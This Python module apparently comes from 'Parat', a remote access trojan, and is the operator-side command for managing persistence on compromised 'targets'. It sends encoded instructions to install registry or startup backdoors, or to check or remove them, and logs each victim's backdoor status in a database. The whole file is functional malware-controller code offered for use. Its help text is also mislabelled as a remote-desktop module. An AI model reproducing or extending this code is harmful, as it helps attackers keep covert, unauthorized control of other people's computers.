#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import argparse
from lib.ParatPrint import pprint, gray
from lib.ParatEncrypt import Encode, Decode


class ParatBackdoor:


    def __init__(self, conn, client_id, db, args, colors):

        self.helps       = ["-h", "--help"]
        self.conn        = conn
        self.client_id   = client_id
        self.db          = db
        self.args        = args
        self.colors      = colors


    def prepare_basics(self):

        self.parser = argparse.ArgumentParser(
            prog         = "modules.RemoteDesktop",
            usage        = "desktop [--argument]",
            description  = "simple command to control RDP protocol"
        )

        self.parser.add_argument(
            '-s', '--status',
            action       = "store_true",
            help         = "display backdoor status"
        )
        self.parser.add_argument(
            '-r', '--remove',
            action       = "store_true",
            help         = "remove all installed backdoors"
        )
        self.parser.add_argument(
            '-a', '--registry',
            action       = "store_true",
            help         = "enable registry method backdoor"
        )
        self.parser.add_argument(
            '-b', '--startup',
            action       = "store_true",
            help         = "enable startup method backdoor"
        )



    def start(self):

        if self.args is None or len(self.args) == 0 or self.args[0] in self.helps:
            self.parser.print_help()

        else:

            try:
                argument = self.parser.parse_args(self.args)

                if argument.status:
                    self.conn.send(Encode("backdoor<#>status"))
                elif argument.remove:
                    self.conn.send(Encode("backdoor<#>remove"))
                elif argument.registry:
                    self.conn.send(Encode("backdoor<#>registry"))
                elif argument.startup:
                    self.conn.send(Encode("backdoor<#>startup"))

                response = Decode(self.conn.recv(4096))

                if "installed." in response or "enable." in response:
                    self.db.execute("UPDATE targets SET Backdoor=? WHERE id=?", (True, self.client_id))
                else:
                    self.db.execute("UPDATE targets SET Backdoor=? WHERE id=?", (False, self.client_id))
                self.db.commit()

                pprint(response) if self.colors else pprint(gray(response))

            except:
                pass
